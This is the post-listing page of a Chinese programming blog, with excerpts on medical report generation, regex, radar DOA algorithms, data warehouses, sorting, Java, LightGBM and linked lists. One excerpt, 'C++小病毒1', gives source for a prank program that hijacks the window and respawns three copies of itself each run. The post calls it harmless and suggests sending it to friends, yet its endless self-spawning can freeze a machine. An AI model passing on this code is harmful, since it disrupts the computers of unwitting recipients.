<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8845a6d7833c6437930d91b9872f8b39/" rel="bookmark">
			PromptMRG: Diagnosis-Driven Prompts for Medical Report Generation
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章汇总 存在的问题 罕见疾病在训练数据中的代表性不足，使其诊断性能不可靠。
解决办法 1：利用预训练的CLIP模型从数据库中检索相似的报告来辅助查询图像的诊断。
2：设计SDL模块根据不同疾病的学习状态自适应调整优化目标。
流程解读 文章涉及了三个模块DDP、CFE和SDL，并且通过LLM来打标记。
Cross-Modal Feature Enhancement(CFE) 该模块的目的：模仿放射科医生通常访问额外的文档作为参考，借助训练数据的报告数据库(即图中的Report Database)来获得更鲁棒的疾病分类特征。
公式中 D A ( X ′ , x V ) DA(X',x^V) DA(X′,xV)就是从数据库这获得的特征。
Self-Adaptive Disease-Balanced Learning(SDL) 输入为CFE模块得到的 x E x^E xE。这里的目的是**利用预测分数来评估不同疾病的学习状态:分数大表明疾病学习得好，分数小表明疾病学习不够。**SDL的损失记为 L S D L L_{SDL} LSDL​。
Diagnosis-Driven Prompt(DDP) 这里通过SDL得到了L个类的分类结果，之后通过CheXbert (Smit et al . 2020)将报告(即标签)转换为14个预定义的疾病标签，可以获得分类标签，并且使用标准交叉熵损失 L C E L_{CE} LCE​进行训练。
在推理过程中，将分类结果转换为标记提示，其中每个标记提示对应一种疾病。向词汇表添加了四个新标记，[BLA]、[POS]、[NEG]和[UNC]，之后对14个预定义类型标记属于"[BLA]、[POS]、[NEG]和[UNC]"中的哪一个。
用LLM辅助疾病标记 用训练报告作为输入，转换晨会适合大语言模型输入的提示Prompt，最终四个标记[BLA]、[POS]、[NEG]和[UNC]中的其中一个。大语言模型使用的是Vicuna-13B (Zheng et al . 2023)。
摘要 医学报告自动生成(MRG)有很大的研究价值，因为它有可能减轻放射科医生繁重的报告编写负担。尽管最近取得了进展，但由于需要精确的临床理解和疾病识别，准确的MRG仍然具有挑战性。此外，疾病分布的不平衡使得挑战更加明显，因为罕见疾病在训练数据中的代表性不足，使其诊断性能不可靠。为了应对这些挑战，我们提出了诊断驱动的医疗报告生成提示(PromptMRG)，这是一个新的框架，旨在通过诊断感知提示的指导提高MRG的诊断准确性。具体来说，PromptMRG是基于编码器-解码器架构，并带有一个额外的疾病分类分支。在生成报告时，来自分类分支的诊断结果将被转换为令牌提示，以显式地指导生成过程。为了进一步提高诊断准确性，我们设计了跨模态特征增强，通过利用预训练CLIP的知识，从数据库中检索相似的报告来辅助查询图像的诊断。此外，基于每种疾病的个体学习状态，通过对分类分支应用自适应逻辑调整损失来解决疾病不平衡问题，克服了文本解码器无法操纵疾病分布的障碍。在两个MRG基准上的实验表明了所提出方法的有效性，在两个数据集上都获得了最先进的临床疗效表现。代码可在https://github.com/jhb86253817/PromptMRG上获得。
介绍 医学图像的自动化分析涉及广泛的任务，如异常检测(Cai et al . 2022)，疾病分类(Luo et al .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8845a6d7833c6437930d91b9872f8b39/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce8aab180ef996caee18027ff548eb48/" rel="bookmark">
			Notepad&#43;&#43; 使用正则表达式删除空行空格方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		删除所有空格 查找框输入：^\s+，替换框留空，什么也不输入，一键全部替换即可。
删除所有空行 查找框输入：\r\n\r\n，替换框输入：\r\n，一键全部替换即可。
段落之间空一行 思路：在第一段文字的末尾存在 $ 作为结束符，在结束符后加上一个空行即可。
查找框输入：$，替换框输入：\r\n，一键全部替换即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36df4b03872db0e566a63721410bc7b2/" rel="bookmark">
			信号DOA估计，多种测角算法原理详解以及算法对比（全）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、毫米波雷达DOA估计（毫米波雷达测角算法）二、3D-FFT测角三、DBF测角四、 capon算法五、music算法测角六、DML算法和SML算法五、不同算法之间的对比 一、毫米波雷达DOA估计（毫米波雷达测角算法） 毫米波雷达的目标角度估计，特别是角度分辨率的提高是雷达探测需要解决的核心问题，使用FFT（快速傅里叶变换）或者DBF（数字波束形成技术）做DOA估计是最简单且运算复杂度最低的方法，但是这两方法并不能实现超分辨，其角分辨率受限于阵列的孔径。
θ r e s = λ d \theta_{res}=\frac{\lambda}{d} θres​=dλ​
上式中， θ r e s \theta_{res} θres​为天线的角度分辨率， N N N为天线的阵列数， d d d为两相邻阵元之间的间距。如果要提高角分辨率那只能通过增加天线数量来增加阵列孔径。
DBF数字波束形成，又叫做空域滤波，是阵列信号处理的一个主要方向。其基本思想是通过将各个阵元输出进行加权求和，将天线波束导向在一个方向，对期望来波方向得到最大输出功率。
3d fft算法，该算法是一种通过对雷达接收信号进行傅里叶变换，将空域信息转换到频域的方法。在频域中，可以通过天线阵列的接收信号进行fft，得到不同方向的空间频率响应，利用不同天线之间的相位差推导出目标的到达角。
CAPON算法又叫最小方差无畸变算法，或称为MVDR算法。思想是最小化信号功率，又使得来波方向为单位增益的准测自适应波束形成。
MUSIC、ROOT-MUSIC是利用信号子空间和噪声子空间的正交性。
ESPRIT是利用信号子空间的旋转不变性。
DML算法，称为确定性最大似然估计，是利用最大似然准测，将背景噪声和接收噪声认为成大量独立的噪声源发射的，因而把噪声过程视为一平稳高斯随机白噪声过程，信号波形则假设为确定性信号，但输入波形是待估计的位置参数。而确定性最大似然估计算法中的未知参数是信号参数 θ \theta θ和噪声方差 σ \sigma σ。这些未知量都是最大化似然估计得到的。
SML算法称为随机性最大似然估计算法，该算法与DML算法类似，同样利用最大似然准则对信号doa进行估计，但是其针对的入射信号服从高斯随机分布模型，此时导出的最大似然算法是SML算法。
上面这几个算法都是超分辨算法，可以克服瑞丽极限。
本文主要对 DOA算法之DBF、3D-FFT、CAPON、MUSIC、ROOT-MUSIC、ESPRIT、DML、SML进行性能的对比。希望通过调研仿真，熟悉各个DOA算法的特点和优缺点，加强自己在不同环境下的算法选择能力。
二、3D-FFT测角 原理：3DFFT（三维快速傅里叶变换）算法是一种通过对雷达接收信号进行傅里叶变换，将空域信息转换到频域的方法。在频域中，可以通过对接收信号的各个方向进行傅里叶变换，得到不同方向的空间频率响应，从而推导出目标的到达角。
天线阵
设相邻的两个天线之间排布间距为 d d d，到达角（angle of arrival，AoA）为 θ \theta θ，则相邻的两个天线之间会产生一个固定的光程差 d sin ⁡ θ d \sin \theta dsinθ，这个固定的光程差会造成相邻两个信道 R x 1 Rx_1 Rx1​和 R x 2 Rx_2 Rx2​间接收回波固定的相位差。即:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36df4b03872db0e566a63721410bc7b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6ffc75811bdd0a4a0a0082d8148978b2/" rel="bookmark">
			一文看懂：数据湖、数据仓库、数据中台，浅显直白！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		许多初入数据分析和数据可视化行业的人，对一些概念的认知往往很模糊，贝格前端工场截借此机会给大家讲解一下数据湖、数据仓库和数据中台的概念，力求浅显易懂。
一、什么是数据湖 数据湖是一种用于存储大量原始数据的存储系统，它可以容纳各种类型的数据，包括结构化数据、半结构化数据和非结构化数据。数据湖的设计目的是为了能够存储大规模的数据，并且能够支持多种数据处理和分析工具的访问和使用。
数据湖通常不会对数据进行预先的清洗、转换和整合，而是以原始的形式存储数据。这使得数据湖能够更好地适应不同类型和格式的数据，并且能够更灵活地支持各种数据处理和分析需求。
数据湖的优势在于它能够存储大规模的数据，包括结构化和非结构化数据，同时能够支持多种数据处理和分析工具的使用。这使得数据湖成为了企业数据管理和分析的重要组成部分，能够帮助企业更好地管理和利用数据资源。
记住核心概念：原始数据。
二、什么是数据仓库 数据仓库是一个用于存储和管理结构化数据的系统。它通常用于支持企业的决策和分析需求。数据仓库的设计目的是为了提供一个集成的、一致的数据存储和管理平台，以便企业可以进行数据分析、报告和决策支持。
数据仓库通常会对数据进行清洗、转换和整合，以确保数据的质量和一致性。它通常包括数据抽取、转换和加载（ETL）过程，用于将数据从不同的来源整合到数据仓库中。数据仓库还提供了多维数据模型和OLAP（联机分析处理）功能，以支持复杂的数据分析和报告需求。
数据仓库的优势在于它提供了一个集成的、一致的数据存储和管理平台，可以支持企业的决策和分析需求。它能够帮助企业整合和管理数据资源，提供高质量的数据用于决策制定和业务分析。数据仓库在企业的数据管理和分析中扮演着重要的角色，是企业信息化建设中的重要组成部分。
记住核心概念：结构化数据
三、什么是数据中台 数据中台是一个用于管理和整合企业数据的平台，它可以连接数据湖和数据仓库，同时支持多种数据处理和分析工具。数据中台的目标是提供一个统一的数据管理和分析平台，以支持企业的数据驱动决策和业务需求。
数据中台的设计理念是将企业的数据资源整合到一个统一的平台上，通过标准化的数据接口和数据模型，为企业内部的各种数据需求提供支持。数据中台通常包括数据集成、数据治理、数据安全、数据质量管理等功能，以确保企业数据的一致性、安全性和可靠性。
数据中台的优势在于它能够整合和管理企业的各种数据资源，包括数据湖、数据仓库以及其他数据存储系统中的数据，同时支持多种数据处理和分析工具的使用。这使得数据中台成为了企业数据管理和分析的重要组成部分，能够帮助企业更好地管理和利用数据资源，支持数据驱动的决策和业务需求。
记住核心概念：使用和展示数据
四、三者之间的区别 数据湖、数据仓库和数据中台是企业数据管理和分析领域中的三个重要概念，它们各自有着不同的特点和功能。
数据湖是一个用于存储大规模原始数据的存储系统，可以容纳各种类型的数据，包括结构化数据、半结构化数据和非结构化数据。数据湖的设计目的是为了能够存储大规模的数据，并且能够支持多种数据处理和分析工具的访问和使用。与传统的数据仓库不同，数据湖通常不会对数据进行预先的清洗、转换和整合，而是以原始的形式存储数据。
数据仓库是一个用于存储和管理结构化数据的系统，通常用于支持企业的决策和分析需求。数据仓库对数据进行清洗、转换和整合，以确保数据的质量和一致性。它包括数据抽取、转换和加载（ETL）过程，用于将数据从不同的来源整合到数据仓库中。数据仓库还提供了多维数据模型和OLAP（联机分析处理）功能，以支持复杂的数据分析和报告需求。
数据中台是一个用于管理和整合企业数据的平台，它可以连接数据湖和数据仓库，同时支持多种数据处理和分析工具。数据中台的目标是提供一个统一的数据管理和分析平台，以支持企业的数据驱动决策和业务需求。数据中台整合和管理企业的各种数据资源，包括数据湖、数据仓库以及其他数据存储系统中的数据，同时支持多种数据处理和分析工具的使用。
总的来说，数据湖主要用于存储原始数据，数据仓库主要用于存储结构化数据并支持决策和分析，数据中台则是整合和管理企业各种数据资源的平台，支持数据驱动的决策和业务需求。
正好我上面说的核心概念吻合。
五、三者之间的联系 数据湖、数据仓库和数据中台在企业数据管理和分析中有着密切的联系和互补的关系。
数据湖和数据仓库：
数据湖通常用于存储原始数据，包括结构化、半结构化和非结构化数据，而数据仓库通常用于存储已经经过清洗、转换和整合的结构化数据，以支持企业的决策和分析需求。数据仓库可以从数据湖中获取需要的数据，进行进一步的处理、整合和分析，从而为企业提供有用的数据洞察。
数据仓库和数据中台：
数据中台可以整合数据仓库中的数据，同时也可以连接数据仓库和其他数据源，如数据湖，以提供一个统一的数据管理和分析平台。数据中台可以为数据仓库提供更灵活的数据访问和使用方式，同时支持多种数据处理和分析工具的使用，从而更好地满足企业的数据驱动决策和业务需求。
数据湖和数据中台：
数据中台可以整合数据湖中的原始数据，同时也可以连接数据湖和其他数据源，如数据仓库，以提供一个统一的数据管理和分析平台。数据中台可以为数据湖提供更丰富的数据处理和分析功能，同时支持数据湖中数据的整合和管理，从而更好地满足企业对原始数据的需求。
数据湖、数据仓库和数据中台在企业数据管理和分析中有着密切的联系和互补的关系，它们可以相互连接、整合和支持，以共同为企业提供更好的数据管理和分析能力。
结束语：现在知道三者区别了，一个原始数据，一个结构化数据，一个使用和展示数据，三者虽然不是一个概念，但是有这千丝万缕联系。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f144d8e88d82653c609d2c3bd750702/" rel="bookmark">
			C&#43;&#43;小病毒1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++小病毒（注：对电脑无过大伤害）
短短行，创造奇迹！
把这个文件命名为virus.exe就可以使用了。
#include&lt;bits/stdc++.h&gt; #include&lt;windows.h&gt; using namespace std; int main() { HWND hwnd = GetForegroundWindow(); int cx = GetSystemMetrics(SM_CXSCREEN);//需要根据电脑的大小设置加减 int cy = GetSystemMetrics(SM_CYSCREEN);//需要根据电脑的大小设置加减 LONG_PTR last_style=GetWindowLongPtr(hwnd,GWL_STYLE); RECT last_rect; GetWindowRect(hwnd,&amp;last_rect); LONG l_WinStyle = GetWindowLong(hwnd,GWL_STYLE); SetWindowLong(hwnd,GWL_STYLE,(l_WinStyle | WS_POPUP | WS_MAXIMIZE)&amp; ~WS_CAPTION &amp; ~WS_THICKFRAME &amp; ~WS_BORDER); SetWindowPos(hwnd, NULL, 0, 0, cx, cy, 0); UpdateWindow(hwnd); MessageBox(0,"电脑出现了问题！","警报",MB_ICONERROR); system("start virus.exe"); system("start virus.exe"); system("start virus.exe"); return 0; } 无实质性伤害，推荐送给好友！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f88a25cd48d7dc39c65075fddb001268/" rel="bookmark">
			【数据结构】第十六弹---C语言实现希尔排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✨个人主页： 熬夜学编程的小林
💗系列专栏： 【C语言详解】 【数据结构详解】【C++详解】
目录
1、希尔排序( 缩小增量排序 )
1.1、预排序实现
1.2、希尔排序代码实现
1.3、代码测试
1.4、时空复杂度分析
1.5、性能比较
总结
上一弹我们学习了直接插入排序，通过时空复杂度分析，时间复杂度为O(N^2)，一般情况效率较低，有没有对直接插入排序进行优化的排序呢？？？没错，我们这一弹讲解的排序就是对直接插入排序的优化的排序！！！
1、希尔排序( 缩小增量排序 ) 希尔排序是一种基于插入排序的算法，通过引入增量的概念来改进插入排序的性能
希尔排序法又称缩小增量法。希尔排序法的基本思想是：将原始列表分成多个子列表，先对每个子列表进行插入排序，然后逐渐减少子列表的数量，使整个列表趋向于部分有序，最后当整个列表作为一个子列表进行插入排序时，由于已经部分有序，所以排序效率高。这个过程中，每次排序的子列表是通过选择不同的“增量”来确定的。
动图如下： 实现思路
预排序直接插入排序 1.1、预排序实现 预排序：
根据当前增量，数组被分为若干子序列，这些子序列的元素在原数组中间隔着固定的增量。对每个子序列应用插入排序。
假设当前增量为5：
首先，增量为5，我们将数组元素分为增量（5）个子序列，每个子序列由原数组中相隔增量位置上的元素组成。所以我们有如下子序列：
子序列1: 9，4
子序列2: 1，8
子序列3: 2，6
子序列4: 5，3
子序列5: 7，5
然后对每个子序列进行独立的插入排序：
子序列1排序后：4，9
子序列2排序后：1，8
子序列3排序后：2，6
子序列2排序后：3，5
子序列3排序后：5，7
一趟排序之后的数组：
4 1 2 3 5 9 8 6 5 7
完成了一轮希尔排序，此时整个数组并不完全有序，但是已经比原始的数组更接近有序了。然后减小增量，通常是将原来的增量除以2（或者除以3+1），现在选择下一个增量为 2，按照此排序规则继续预排序即可，直到增量为1时，则为直接插入排序，此时则排序完成。
一个子序列排序实现：
int gap; int end; int tmp = a[end + gap]; while (end &gt;= 0) { if (a[end] &gt; tmp) { a[end + gap] = a[end]; end-=gap; } else { break; } } a[end + gap] = tmp; 与直接插入代码不同的是，这里对end所加减的均为gap；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f88a25cd48d7dc39c65075fddb001268/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5734373fea79b5ef5070ab67cb984ae/" rel="bookmark">
			等待 chrome.storage.local.get() 完成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		chrome.storage.local.get() 获取存储处理并计数，内部计数正常，外部使用始终为0，百思不得其解。
如何在继续执行之前等待异步chrome.storage.local.get()完成-腾讯云开发者社区-腾讯云 (tencent.com)
原来我忽略了异步问题，最简单的方案就是一次取多个值，并在内部完成所有操作！
chrome.storage.local.get(['is_light', 'is_hide', 'keyword_light', 'keyword_hide'], function (result) { //console.log(result); if (result.is_light) { var s = result.keyword_light; var sl = s.split(';'); var a = document.getElementsByTagName('a'); for (var i = 0; i &lt; a.length; i++) { for (var j = 0; j &lt; sl.length; j++) { if (a[i].textContent.indexOf(sl[j]) != -1) { a[i].style.color = 'white'; a[i].style.backgroundColor = '#DA3434'; a[i].innerHTML = a[i].textContent; count_light++; } } } } if (result.is_hide) { var s = result.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5734373fea79b5ef5070ab67cb984ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf2b7af2e43eccaad6edfc835e17a50b/" rel="bookmark">
			Java——面向对象进阶（三）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：
抽象类，接口，内部类
文章目录 一、抽象类1.1 抽象方法1.2 抽象类1.3 抽象类的使用 二、 接口2.1 接口的定义和实现2.2 default 关键字2.3 实现接口时遇到的问题 三、内部类3.1 成员内部类3.2 静态内部类3.3 成员内部类3.4 匿名内部类（最常用） 一、抽象类 在Java中，抽象类是一种不能被实例化的类，它通常用于定义一些共用的方法和字段，在该类中不知道具体的实现，但还是想让子类必须去实现这些方法，所以将成员方法定义成抽象方法，该类定义成抽象类。abstract 用于修饰方法方法和类，修饰的方法是抽象方法，修饰的类是抽象类。
1.1 抽象方法 使用abstract 关键字修饰方法，该方法就成了抽象方法，抽象方法只包含一个方法名，而没有方法体。
定义格式： 修饰符 abstract 返回值类型 方法名 (参数列表); 示例: public abstract void run(); 1.2 抽象类 使用abstract 关键字修饰类，
形式: abstract class 类名字 { } 示例: public abstract class Animal { public abstract void run()； } ！注意：抽象类不一定有抽象方法，但有抽象方法的类一定要定义成抽象类
1.3 抽象类的使用 继承抽象类：
如果一个类继承了一个抽象类，并且这个类不是抽象类，那么它必须实现所有从抽象类继承的抽象方法。如果一个类继承了一个抽象类，但没有实现所有的抽象方法，那么这个类必须声明为抽象类。 抽象类的继承链：
一个抽象类可以继承另一个抽象类，并且可以选择性地实现部分或全部继承的抽象方法。最终，必须有一个具体（非抽象）的子类实现所有抽象方法。 示例代码：
子类实现所有抽象方法
abstract class Animal { abstract void makeSound(); abstract void eat(); } class Dog extends Animal { @Override void makeSound() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf2b7af2e43eccaad6edfc835e17a50b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afc81cc94c1e4f2464edf95761f29166/" rel="bookmark">
			基于单片机的无人监守点滴控制系统设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 摘要 ： 在当代社会 ， 点滴是一种常用的诊疗方法 。 为了减轻医护人员的压力 ， 设计了一种基于单片机的无人监守点滴控制系统， 该系统共由 2 个板子组成 ， 其中一个主控板子 ， 一个检测板子 。 检测板与主控板之间使用杜邦线进行连接 。 检测系统使用红外对管对吊瓶输液速度进行检测。 通过 LCD1602 液晶屏幕显示吊瓶点滴的速度 ， 当检测板检测到液滴滴完会发出报警信息， 通知医护人员 。 关键词 ： 单片机 ， 液晶显示 ， 红外对管 我国老龄化给医疗卫生领域带来了严峻的考验 。 长期以来 ，患者的静脉输液过程一直得不到很好的解决。 本文针对这一临床现状， 提出了点滴监控系统的设计思路 ， 利用光电光电传感器 ， 在不影响传统静脉输液形式的前提下， 实现对点滴滴数的监测 。 1 系统总体设计 本文所设计的无人监守点滴控制系统使用 STC89C52 单片机作为采集板主控制芯片， 单片机采集板利用红外对管检测点滴输液情况， 然后通过液晶模块实时显示吊瓶中液滴的速度 。根据整个硬件电路的工作原理， 硬件电路的系统结构图如图 1所示。 1．1 红外对管检测电路 这次设计是通过红外对管对液滴信号进行监测 ， 当有液体经过时， 根据红外线的物理熟悉特点 ， 要是有液体经过的情况下， 红外对管的接收头就会因有液体通过的影响而导致获取不到红外线， 或者得到一个很小很小的红外线信号， 此时检测模块会呈现一个很小的电压变化信号。 红外对管的元器件主要就是一个红外发射器， 一个接收器， 其主要组成方式如图 2 。 红外对管采集的原始数据肯定会夹杂着干扰信号， 因此在收集完输送数据给单片机前必须要对这个采集的信号进行滤波处理。 我们可以通过利用差动放大器的原理来对这些信号进行初步处理， 然后再在差动放大器后面增加一个滤波器来将干扰信号滤波。 如图 3 ： 1．2 报警电路的设计 报警电路单元实现的是当到达报警条件时， 报警电路单元进行报警 ， 提醒医护人员。 从图 4 中可以看得出报警部分由蜂鸣器和晶体管构成的， 其正极接入晶体管 5V 电压形成共阳极的报警部分。 单片机的 P20 口接入报警系统 ，其中采用的为 PNP 结构 ， 其作用相当于开关。 2 系统软件设计 2．1 主控模块 当电源开关被按下 ， 系统初始化 。当系统正常运行以后， 红外对射管不断检测光源信号强弱变化， 之后经转换电路转换为高低电平信号并输入到单片机。 单片机计算每分钟液滴的滴落速度 ， 并通过液晶屏显示。 要是检测到点滴完成 ， 则由发光二极管和蜂鸣器进行报警提示。 其流程图如图 5 所示 。 2．2 液体点滴检测程序 系统设计的关键功能在于液体点滴速度的实时监测 。 系统初始化后， 单片机内部的计数器与定时器复位为零 。 选用红外对射管以透射形式检测点滴状况， 当传感器检测到液滴滴落时 ， 给单片机触发信号， 计数器开始累加 。 通过判断液滴滴落间歇时间， 系统内部计算点滴实时速度 。 其流程图如图 6 所示 。 2．3 报警子程序 正常情况下 ， 输液系统点滴维持在安全范围内。 传感器检测 到点滴下落间隔时间延长 ， 即点滴速度过慢时 ， 单片机输出使能 信号给发光二极管以及蜂鸣器 ， 实现声光报警 。 如图 7 所示 。 3 结束语 该系统以 STC89C52 为控制核心 ， 检测系统使用红外对管对吊瓶输液速度进行检测。 通过 LCD1602 液晶屏幕显示吊瓶点滴的速度， 当检测板检测到液滴滴完会发出报警信息 ， 能够保证病人打点滴时无需医务人员值守， 减轻了医护人员的工作负担 。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cac558fc1b35ff8f21af1fc808889bc5/" rel="bookmark">
			【机器学习】LightGBM: 优化机器学习的高效梯度提升决策树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🌈个人主页: 鑫宝Code
🔥热门专栏: 闲话杂谈｜ 炫酷HTML | JavaScript基础 ​💫个人格言: "如无必要，勿增实体" 文章目录 LightGBM: 优化机器学习的高效梯度提升决策树引言一、LightGBM概览二、核心技术解析1. 直方图近似（Histogram Approximation）2. 基于梯度的单边采样（Gradient-Based One-Side Sampling, GOSS）3. 特征并行与数据并行 三、与其他GBDT实现的对比四、实践应用与调参技巧五、结论 LightGBM: 优化机器学习的高效梯度提升决策树 引言 在机器学习领域，梯度提升决策树(Gradient Boosting Decision Tree, GBDT)因其强大的预测能力和解释性而备受推崇。随着数据规模的日益增大，对模型训练速度和效率的需求也愈发迫切。在此背景下，Microsoft Research于2017年开源的LightGBM项目，凭借其高速度、高效率以及优秀的性能，在众多GBDT框架中脱颖而出，成为业界和学术界的新宠。本文将深入探讨LightGBM的核心优势、工作原理、关键特性和应用场景，旨在为读者提供一份全面而深入的理解指南。
一、LightGBM概览 诞生背景：面对传统GBDT在处理大规模数据集时遇到的内存消耗大、训练时间长等问题，LightGBM应运而生，它通过一系列创新算法设计显著提高了训练效率。
核心特点：
高效性：利用直方图近似和基于梯度的单边采样等技术，大幅减少计算量。低内存消耗：通过叶子权重直方图存储方式，极大降低了内存使用。高并行性：支持特征并行、数据并行和投票并行等多种并行策略，加速训练过程。灵活性：支持自定义目标函数和评估指标，满足多样化需求。 二、核心技术解析 1. 直方图近似（Histogram Approximation） 传统的GBDT方法在每一轮迭代中需要遍历所有数据来计算梯度，这在大数据场景下极为耗时。LightGBM引入了直方图的概念，将连续的特征值离散化为几个区间，仅需统计每个区间内的样本数量和梯度统计量，从而大大减少了计算量，加速了训练过程。
2. 基于梯度的单边采样（Gradient-Based One-Side Sampling, GOSS） GOSS是一种有效的样本抽样策略，它根据样本的梯度大小进行有偏抽样，保留梯度较大的样本和一部分梯度较小的样本，这样既保留了重要信息，又大幅度减少了计算量，进一步提升了效率。
3. 特征并行与数据并行 特征并行：将特征分配到不同的机器上进行独立的直方图构建，然后合并这些直方图，适用于特征维度较高的情况。数据并行：将数据集分割到不同机器，每台机器上分别建立自己的决策树，最后汇总决策树结果，适用于大数据集。
三、与其他GBDT实现的对比 与XGBoost相比，LightGBM在训练速度和内存使用上通常表现更优，特别是在数据量较大时。然而，XGBoost提供了更多的调参选项，对于高度定制化的任务可能更为灵活。两者各有千秋，选择应依据具体任务需求。
四、实践应用与调参技巧 应用领域：LightGBM广泛应用于推荐系统、搜索引擎排名、金融风控、医疗诊断等多个领域，以其高效、准确的特性解决了一系列实际问题。
调参建议：
学习率：初始值可设为0.1，过拟合时减小。树的最大深度：默认31，可根据数据复杂度调整。叶子节点最小样本数：控制模型复杂度，避免过拟合。特征抽样比例：通过调整feature_fraction参数平衡模型复杂度与性能。 以下是一个使用Python和LightGBM库进行分类任务的基本示例代码。这个例子中，我们将使用经典的鸢尾花（Iris）数据集来训练一个简单的LightGBM模型，并进行基本的模型评估。代码仅供参考🐶
# 导入所需库 import lightgbm as lgb from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cac558fc1b35ff8f21af1fc808889bc5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1fcec5708f86b851fde47665165ba99/" rel="bookmark">
			【算法专题--链表】反转链表II--高频面试题（图文详解，小白一看就会！！！）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、前言
二、题目描述 三、解题方法
⭐迭代法 --- 带哨兵位（头节点） 🥝 什么是哨兵位头节点？
🍍 解题思路 四、总结与提炼
五、共勉 一、前言 反转链表II这道题，可以说是--链表专题--，最经典的一道题，也是在面试中频率最高的一道题目，通常在面试中，面试官可能会从多个方面考察这道题目，所以大家需要对这道题目非常熟悉哦！！
本片博客就来详细的讲讲解一下 反转链表II 的实现方法，让我们的面试变的更加顺利！！！
二、题目描述 给你单链表的头指针 head 和两个整数 left 和 right ，其中 left &lt;= right 。请你反转从位置 left 到位置 right 的链表节点，返回 反转后的链表 。
三、解题方法 ⭐迭代法 --- 带哨兵位（头节点） 🥝 什么是哨兵位头节点？ 首先，先来了解一下什么是 哨兵位---头节点 ？
它是一个附加的链表结点，该 结点 作为第一个节点，它的数据域不存储任何东西，只是为了操作的方便而引入的。也就是说，如果一个链表有哨兵节点的话，那么链表表的第一个元素应该是链表的第二个节点。 哨兵位 --- 头节点的作用： 比如向链表中插入一个节点，对于没有哨兵位的单链表，当待插入的节点为链表的第一个节点，由于没有前驱，需要进行特殊处理，从而代码的复杂性增加。如果有哨兵位头节点，则第一个节点的处理方式与其它节点相同，可以统一进行处理。 🍍 解题思路 这道题，其实就是之前讲过的 ---- 反转链表 --- 的升级版如果我们把要 反转的区间 抽取出来，看作一个独立的链表，那么其反转的过程与反转链表的过程是一样的。 而现在我们比 反转链表 多了一步是，我们要把抽取出来反转后的区间在拼接回去。 为了把反转后的局部链表拼接回去，我们需要知道四个定位节点：
reversePre： 反转区间的前一个节点reverseHead：反转区间的头节点reverseTail： 反转区间的尾节点reverseNext： 反转区间的下一个节点 我们要把反转后的链表拼接回去，实际上就是让 reversePre 的 next指针 指向 reverseTail，让reverseHead 的 next指针 指向 reverseNext。
	</div>
	<div class="list__footer clearfix">
